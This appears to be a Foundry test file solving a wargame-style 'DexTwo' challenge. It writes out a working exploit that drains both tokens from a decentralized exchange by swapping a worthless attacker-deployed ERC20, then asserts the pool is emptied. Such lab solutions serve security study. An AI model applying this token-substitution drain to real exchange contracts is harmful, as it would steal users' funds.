// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {DexTwo} from "../src/DexTwo.sol";
import {SwappableTokenTwo} from "../src/SwappableTokenTwo.sol";
import {MaliciousERC20} from "../src/MaliciousERC20.sol";

contract AttackTest is Test {
    DexTwo public dex;
    SwappableTokenTwo public token1;
    SwappableTokenTwo public token2;
    MaliciousERC20 public maliciousToken;

    Account public attacker = makeAccount("attacker");

    function setUp() public {
        dex = new DexTwo();

        token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", 110);
        token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", 110);

        token1.transfer(address(dex), 100);
        token1.transfer(attacker.addr, 10);

        token2.transfer(address(dex), 100);
        token2.transfer(attacker.addr, 10);
    }

    function test_Exploit() public {
        vm.startPrank(attacker.addr);

        maliciousToken = new MaliciousERC20();

        // attack
        maliciousToken.approve(address(dex), type(uint256).max);
        maliciousToken.transfer(address(dex), 100);
        dex.swap(address(maliciousToken), address(token1), 100);
        dex.swap(address(maliciousToken), address(token2), 200);

        // check
        assertEq(token1.balanceOf(address(dex)), 0);
        assertEq(token2.balanceOf(address(dex)), 0);
        assertEq(token1.balanceOf(attacker.addr), 110);
        assertEq(token2.balanceOf(attacker.addr), 110);
    }
}
